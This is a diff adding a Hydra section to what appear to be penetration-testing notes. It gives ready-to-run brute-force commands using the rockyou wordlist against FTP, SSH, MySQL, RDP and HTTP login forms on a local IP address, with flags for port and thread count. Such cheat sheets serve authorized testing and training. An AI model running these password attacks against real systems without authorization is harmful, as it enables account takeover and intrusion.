@@ -87,3 +87,46 @@ grep -E '[0-9]' rockyou-lowercase.txt > filtered.txt
 
 # Hydra
 
+Hydra is a brute forcing tool that can be used to attack a plethora of different services. Hydra utilizes parallell threads to speed up the cracking process. 
+
+Hydra uses built-in modules to properly interact with different protocols and their authentication mechanisms. 
+
+Examples:
+
+```bash
+hydra -l admin -P rockyou.txt ftp://192.168.1.100
+```
+
+```bash
+hydra -l root -P rockyou.txt ssh://192.168.1.100
+```
+
+```bash
+hydra -l root -P rockyou.txt mysql://192.168.1.100
+```
+
+```bash
+hydra -l admin -P rockyou.txt rdp://192.168.1.100
+```
+
+```bash
+hydra -l admin -P rockyou.txt 192.168.1.100 http-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect"
+```
+
+```bash
+hydra -l admin -P rockyou.txt 192.168.1.100 http-get
+```
+
+Hydra targets the default port if not instructed otherwise. Specify a non-default port with the **-s** flag:
+
+```bash
+hydra -l admin -P rockyou.txt ftp://192.168.1.100 -s 2121
+```
+
+The number of parallell threads is modified with the **-t** flag:
+
+```bash
+hydra -l admin -P rockyou.txt ftp://192.168.1.100 -t 20
+```
+
+## Attacking HTTP Basic Authentication
